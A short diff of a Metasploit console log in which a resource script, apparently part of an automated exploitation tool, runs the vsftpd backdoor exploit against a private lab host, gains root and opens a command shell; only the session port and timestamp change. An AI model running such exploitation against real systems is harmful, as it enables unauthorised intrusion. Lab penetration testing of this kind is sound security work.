@@ -15,6 +15,6 @@ resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_vsftpd.rc)> ru
 [1m[32m[+][0m 192.168.56.103:21 - Backdoor service has been spawned, handling...
 [1m[32m[+][0m 192.168.56.103:21 - UID: uid=0(root) gid=0(root)
 [1m[34m[*][0m Found shell.
-[1m[34m[*][0m Command shell session 1 opened (192.168.56.102:37709 -> 192.168.56.103:6200) at 2025-05-25 20:24:31 -0400
+[1m[34m[*][0m Command shell session 1 opened (192.168.56.102:46379 -> 192.168.56.103:6200) at 2025-06-04 19:33:09 -0400
 
 [0m
